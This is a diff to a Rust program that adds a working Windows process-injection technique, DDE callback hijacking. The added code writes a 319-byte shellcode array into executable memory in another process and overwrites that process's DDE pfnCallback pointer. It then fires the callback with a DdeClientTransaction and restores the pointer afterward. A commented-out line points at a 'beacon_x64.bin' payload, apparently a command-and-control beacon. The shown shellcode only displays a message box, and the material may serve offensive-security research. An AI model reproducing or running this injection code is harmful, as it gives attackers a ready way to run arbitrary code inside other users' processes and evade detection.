@@ -1,9 +1,10 @@
 #![allow(non_snake_case)]
 use std::{
     env::consts,
-    mem::zeroed,
+    mem::{offset_of, zeroed},
+    ops::Add,
     os::{raw::c_void, windows::raw::HANDLE},
-    ptr::null_mut,
+    ptr::{null, null_mut},
 };
 
 use windows_sys::Win32::{
@@ -11,18 +12,48 @@ use windows_sys::Win32::{
     System::{
         DataExchange::{
             APPCLASS_STANDARD, APPCMD_FILTERINITS, CONVINFO, CP_WINANSI, DMLERR_NO_ERROR,
-            DdeConnect, DdeConnectList, DdeCreateStringHandleA, DdeDisconnectList,
-            DdeFreeStringHandle, DdeGetLastError, DdeInitializeA, DdeQueryConvInfo,
-            DdeQueryNextServer, DdeQueryStringA, HCONV, HSZ, PFNCALLBACK, QID_SYNC,
+            DdeClientTransaction, DdeConnect, DdeConnectList, DdeCreateStringHandleA,
+            DdeDisconnectList, DdeFreeStringHandle, DdeGetLastError, DdeInitializeA,
+            DdeQueryConvInfo, DdeQueryNextServer, DdeQueryStringA, HCONV, HSZ, PFNCALLBACK,
+            QID_SYNC, XTYP_EXECUTE,
         },
-        Diagnostics::Debug::ReadProcessMemory,
+        Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
+        Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+            VirtualAllocEx, VirtualProtectEx,
+        },
         Threading::{
-            OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ,
-            PROTECTION_LEVEL_CODEGEN_LIGHT, QueryFullProcessImageNameA,
+            OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
+            PROCESS_VM_WRITE, PROTECTION_LEVEL_CODEGEN_LIGHT, QueryFullProcessImageNameA,
         },
     },
     UI::WindowsAndMessaging::{GetWindowLongPtrA, GetWindowThreadProcessId},
 };
+
+// const SHELLCODE: &[u8] = include_bytes!("../beacon_x64.bin");
+const SHELLCODE: [u8; 319] = [
+    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
+    0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
+    0x48, 0x8b, 0x52, 0x20, 0x41, 0xb9, 0xa7, 0x07, 0x20, 0x6f, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
+    0xb7, 0x4a, 0x48, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9,
+    0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
+    0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x6f, 0x00, 0x00, 0x00, 0x8b,
+    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x64, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,
+    0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x53, 0x44, 0x8b, 0x4c, 0x24, 0x08, 0x48,
+    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9,
+    0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x45, 0x39, 0xd1, 0x75, 0xdb, 0x58, 0x44, 0x8b,
+    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01,
+    0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
+    0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59,
+    0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75,
+    0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0xa4, 0x89, 0xbc,
+    0x59, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x17, 0x00, 0x00, 0x00, 0x44,
+    0x44, 0x45, 0x20, 0x43, 0x61, 0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x20, 0x48, 0x69, 0x6a, 0x61,
+    0x63, 0x6b, 0x69, 0x6e, 0x67, 0x00, 0x5a, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x44, 0x44, 0x45, 0x20,
+    0x4d, 0x73, 0x67, 0x42, 0x6f, 0x78, 0x00, 0x41, 0x58, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x4a, 0x12,
+    0xea, 0xc0, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xbf, 0xdb, 0x19, 0x69, 0xff, 0xd5,
+];
+const SHELLCODE_SIZE: usize = SHELLCODE.len();
 
 type LATOM = u16;
 
@@ -182,6 +213,33 @@ fn enum_dde() {
     }
 }
 
+fn restore_callback(
+    h_proc: *mut c_void,
+    instance_addr: *const CL_INSTANCE_INFO,
+    org_callback: usize,
+) {
+    unsafe {
+        let pfncallbk_addr =
+            (instance_addr as usize).add(offset_of!(CL_INSTANCE_INFO, pfnCallback));
+
+        let mut bytes_written: usize = 0;
+        if WriteProcessMemory(
+            h_proc,
+            pfncallbk_addr as *mut c_void,
+            &org_callback as *const _ as *const c_void,
+            size_of::<usize>(),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!(
+                "[-] WriteProcessMemory failed: {}",
+                std::io::Error::last_os_error()
+            );
+        }
+        println!("[+] pfnCallback restored: 0x{:016x}", org_callback);
+    }
+}
+
 fn inject_dde() {
     unsafe {
         let mut instance_id: u32 = 0;
@@ -257,7 +315,11 @@ fn inject_dde() {
         }
         println!("[+] EWN[0] DDEMLUnicodeServer: 0x{:016x}", ewm0 as usize);
 
-        let h_proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
+        let h_proc = OpenProcess(
+            PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+            0,
+            pid,
+        );
         if h_proc.is_null() {
             println!(
                 "[-] OpenProcess failed: {}",
@@ -335,6 +397,7 @@ fn inject_dde() {
                 "[-] ReadProcessMemory failed: {}",
                 std::io::Error::last_os_error()
             );
+            CloseHandle(h_proc);
             return;
         }
 
@@ -343,6 +406,80 @@ fn inject_dde() {
             "[+] pfnCallback Prologue: {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X}",
             buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7]
         );
+
+        let remote_mem = VirtualAllocEx(
+            h_proc,
+            null_mut(),
+            SHELLCODE_SIZE,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+        if remote_mem.is_null() {
+            println!(
+                "[-] VirtualAllocEx failed: {}",
+                std::io::Error::last_os_error()
+            );
+            CloseHandle(h_proc);
+            return;
+        }
+
+        let mut bytes_written: usize = 0;
+        if WriteProcessMemory(
+            h_proc,
+            remote_mem,
+            SHELLCODE.as_ptr() as *const c_void,
+            SHELLCODE_SIZE,
+            &mut bytes_written,
+        ) == 0
+        {
+            println!(
+                "[-] WriteProcessMemory failed: {}",
+                std::io::Error::last_os_error()
+            );
+            CloseHandle(h_proc);
+            return;
+        }
+
+        let pfncallbk_addr =
+            (instance_addr as usize).add(offset_of!(CL_INSTANCE_INFO, pfnCallback)) as *mut c_void;
+
+        let mut bytes_written: usize = 0;
+        if WriteProcessMemory(
+            h_proc,
+            pfncallbk_addr,
+            &remote_mem as *const _ as *const c_void,
+            std::mem::size_of::<*mut c_void>(),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!(
+                "[-] WriteProcessMemory failed: {}",
+                std::io::Error::last_os_error()
+            );
+            CloseHandle(h_proc);
+            return;
+        }
+
+        let mut trans_result = 0;
+        let result = DdeClientTransaction(
+            "\0".as_ptr() as *const u8,
+            1,
+            hconv,
+            null_mut(),
+            0,
+            XTYP_EXECUTE,
+            5000,
+            &mut trans_result,
+        );
+
+        if result.is_null() {
+            println!(
+                "[-] DdeClientTransaction failed: {}",
+                DdeGetLastError(instance_id)
+            );
+        }
+
+        restore_callback(h_proc, instance_addr, org_callbak);
     }
 }
 
